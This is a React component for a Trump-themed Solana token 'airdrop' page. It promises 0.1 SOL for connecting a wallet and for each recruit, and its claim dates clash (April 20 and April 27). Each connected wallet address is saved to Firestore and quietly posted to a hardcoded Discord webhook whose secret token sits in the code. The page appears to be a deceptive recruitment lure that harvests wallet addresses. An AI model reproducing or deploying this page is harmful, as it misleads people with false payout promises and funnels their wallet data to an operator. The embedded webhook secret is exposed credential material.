import React, { useEffect, useState } from 'react';
import trumpImg from '../assets/trump.png';
import { useWallet } from '@solana/wallet-adapter-react';
import { doc, setDoc, getDoc } from 'firebase/firestore';
import { db } from '../firebase';
import bs58 from 'bs58';
import TelegramPromo from '../components/TelegramPromo';

const Airdrop = () => {
  const { publicKey, connect, connected } = useWallet();
  const [refLink, setRefLink] = useState('');
  const [copied, setCopied] = useState(false);
  const [countdown, setCountdown] = useState('');
  const [error, setError] = useState('');

  const launchDate = new Date('2025-04-27T00:00:00Z');
  const blacklist = [
    '2vY6rLpZ7U6u1iX3Kb9TBLk8FWpjmR3SzDeYN2vgqvnU',
    '4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD'
  ];

  const isValidWallet = (address) => {
    try {
      const decoded = bs58.decode(address);
      return decoded.length === 32;
    } catch {
      return false;
    }
  };

  const sendToDiscord = async (wallet) => {
    try {
      await fetch('https://discord.com/api/webhooks/1360353395365380177/5Lejy62BSrPzxKQ-Ak7kaZJ8AROonM0-49o-1_n9oOoAia9Rcg0fGBlSZC_iQHfA6trA', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `📥 Nova carteira registrada: \`${wallet}\``,
        }),
      });
    } catch (err) {
      console.error('Erro ao enviar webhook:', err);
    }
  };

  useEffect(() => {
    if (publicKey) {
      const walletAddress = publicKey.toBase58();

      if (!isValidWallet(walletAddress)) {
        alert('❌ Invalid wallet address.');
        return;
      }

      if (blacklist.includes(walletAddress)) {
        alert('🚫 This wallet is not allowed to claim.');
        return;
      }

      setRefLink(`${window.location.origin}/?ref=${walletAddress}`);
      localStorage.setItem('walletConnected', 'true');

      const saveUser = async () => {
        const docRef = doc(db, 'users', walletAddress);
        const docSnap = await getDoc(docRef);
        if (!docSnap.exists()) {
          await setDoc(docRef, {
            wallet: walletAddress,
            referral: new URLSearchParams(window.location.search).get('ref') || null,
            createdAt: new Date().toISOString(),
            claimed: false
          });
          await sendToDiscord(walletAddress);
        }
      };

      saveUser();
    }
  }, [publicKey]);

  useEffect(() => {
    const reconnect = localStorage.getItem('walletConnected') === 'true';
    if (reconnect && !connected) {
      connect().catch(() => {});
    }
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      const now = new Date();
      const distance = launchDate.getTime() - now.getTime();
      if (distance < 0) {
        setCountdown('Claim is now available!');
        clearInterval(timer);
      } else {
        const d = Math.floor(distance / (1000 * 60 * 60 * 24));
        const h = Math.floor((distance / (1000 * 60 * 60)) % 24);
        const m = Math.floor((distance / (1000 * 60)) % 60);
        const s = Math.floor((distance / 1000) % 60);
        setCountdown(`${d}d ${h}h ${m}m ${s}s`);
      }
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const copyLink = () => {
    navigator.clipboard.writeText(refLink);
    setCopied(true);
    setTimeout(() => setCopied(false), 3000);
  };

  return (
    <>
      <div className="min-h-screen bg-[#0a369d] text-white flex flex-col md:flex-row items-center justify-center p-6">
        <div className="w-full md:w-1/2 flex justify-center mb-8 md:mb-0">
          <img src={trumpImg} alt="Trump" className="w-72 md:w-[450px]" />
        </div>
        <div className="w-full md:w-1/2 text-center md:text-left max-w-lg">
          <h1 className="text-4xl md:text-6xl font-bold mb-4">MAGE TRUMP TOKEN</h1>
          <p className="text-lg md:text-xl mb-2">Grab <span className="text-yellow-400 font-bold">$MAGE</span> Early — Limited Time!</p>
          <p className="mb-4 text-white/90">
            Connect your wallet and earn 0.1 SOL instantly.<br />
            🚀 Launch is near — start spreading your referral link now and multiply your rewards!
          </p>

          <button
            disabled
            className="bg-gray-600 cursor-not-allowed text-white font-semibold px-5 py-2 rounded-lg opacity-70"
          >
            Claim (available April 20)
          </button>

          {connected && (
            <>
              <p className="text-sm text-white/70 mt-4 mb-1">🔗 Share this link and earn 0.1 SOL for each recruit:</p>
              <div
                className="bg-white text-black px-4 py-2 rounded-xl mt-1 break-all cursor-pointer hover:bg-gray-100 transition"
                onClick={copyLink}
              >
                {refLink}
              </div>
              {copied && <p className="text-green-300 mt-1 text-sm">Link copied!</p>}
              <div className="mt-6">
                <p className="text-white/80">⏳ Claim available in:</p>
                <p className="text-xl font-bold text-yellow-300 mt-1">{countdown}</p>
              </div>
            </>
          )}
          {!connected && (
            <div className="mt-4 text-red-300">
              ❌ Connect your wallet to see your airdrop link and eligibility.
            </div>
          )}
          {error && <p className="text-red-400 mt-4">{error}</p>}
        </div>
      </div>

      {/* Telegram bot promo */}
      <TelegramPromo />
    </>
  );
};

export default Airdrop;
